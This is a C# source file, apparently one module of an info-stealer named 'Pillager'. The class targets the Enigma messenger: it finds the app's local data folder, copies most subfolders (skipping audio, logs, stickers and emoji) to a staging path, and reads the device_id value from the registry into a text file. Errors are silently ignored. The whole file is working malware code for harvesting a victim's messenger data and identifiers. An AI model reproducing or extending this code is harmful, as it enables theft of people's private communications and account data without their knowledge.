using Microsoft.Win32;
using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace Pillager.Messengers
{
    internal class Enigma
    {
        public static string MessengerName = "Enigma";

        public static string MessengerPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Enigma\\Enigma");

        public static void Save(string path)
        {
            try
            {
                if (!Directory.Exists(MessengerPath)) return;
                string savepath = Path.Combine(path, MessengerName);
                Directory.CreateDirectory(savepath);
                foreach (var temppath in Directory.GetDirectories(MessengerPath))
                {
                    if (temppath.Contains("audio") || temppath.Contains("log") || temppath.Contains("sticker") || temppath.Contains("emoji"))
                        continue;
                    string dirname = new DirectoryInfo(temppath).Name;
                    Methods.CopyDirectory(temppath,Path.Combine(savepath, dirname),true);
                }
                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Enigma\\Enigma");
                string deviceid = (string)key.GetValue("device_id");
                File.WriteAllText(Path.Combine(savepath, "device_id.txt"), deviceid);
            }
            catch { }
        }
    }
}
